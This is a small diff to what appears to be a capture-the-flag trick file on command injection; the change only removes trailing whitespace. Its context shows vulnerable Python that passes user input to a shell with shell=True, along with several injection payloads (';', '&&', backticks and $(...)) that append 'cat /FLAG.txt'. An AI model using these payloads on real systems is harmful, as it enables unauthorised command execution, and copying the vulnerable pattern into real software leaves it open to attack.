@@ -15,10 +15,10 @@ tricks:
       # Vulnerable code:
       # command = 'ping -c 2 ' + ip_address
       # subprocess.Popen(command, shell=True, ...)
-      
+
       # Payload:
       ; cat /FLAG.txt
-      
+
       # Result: ping -c 2 ; cat /FLAG.txt
 
   - name: "Alternative command injection payloads"
@@ -30,4 +30,3 @@ tricks:
       && cat /FLAG.txt      # and (if ping succeeds)
       `cat /FLAG.txt`       # backticks
       $(cat /FLAG.txt)      # command substitution
-
